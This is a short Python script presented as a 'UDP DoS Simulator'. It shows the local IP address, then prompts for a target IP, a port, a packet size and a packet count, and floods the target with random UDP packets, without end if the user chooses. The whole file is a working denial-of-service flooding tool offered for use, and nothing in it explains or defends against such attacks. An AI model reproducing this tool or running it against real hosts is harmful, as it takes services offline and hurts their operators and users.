import socket
import random
import time
import os
import socket as s
from datetime import datetime

# Get current network IP
def get_local_ip():
    sck = s.socket(s.AF_INET, s.SOCK_DGRAM)
    sck.settimeout(0)
    try:
        sck.connect(('10.254.254.254', 1))
        ip = sck.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        sck.close()
    return ip

# Show current local IP
local_ip = get_local_ip()

# Show timestamp info
now = datetime.now()
print(f"Started at: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
print(f"Current Network IP: {local_ip}\n")

def attack():
    # Setup socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # User inputs
    ip = input("Target IP (e.g., 127.0.0.1): ")
    port = int(input("Target Port (e.g., 9999): "))
    packet_size = int(input("Packet size in bytes (e.g., 1490): "))
    packet_count = int(input("How many packets to send? (0 = infinite): "))

    # Prepare data
    data = random._urandom(packet_size)
    sent = 0

    print("\nSending packets...\nPress Ctrl+C to stop.\n")

    try:
        if packet_count == 0:
            # Infinite loop
            while True:
                sock.sendto(data, (ip, port))
                sent += 1
                print(f"Sent packet {sent} to {ip}:{port}")
        else:
            # Limited number of packets
            while sent < packet_count:
                sock.sendto(data, (ip, port))
                sent += 1
                print(f"Sent packet {sent} to {ip}:{port}")
    except KeyboardInterrupt:
        print("\nSending interrupted by user.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
        print("Socket closed.\n")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"Current Network IP: {local_ip}")
        print("Welcome to the UDP DoS Simulator!")
        print("1. Start Attack")
        print("2. Exit")

        choice = input("Select an option (1/2): ")

        if choice == "1":
            attack()
        elif choice == "2":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please choose again.")
            time.sleep(1)

if __name__ == "__main__":
    main()
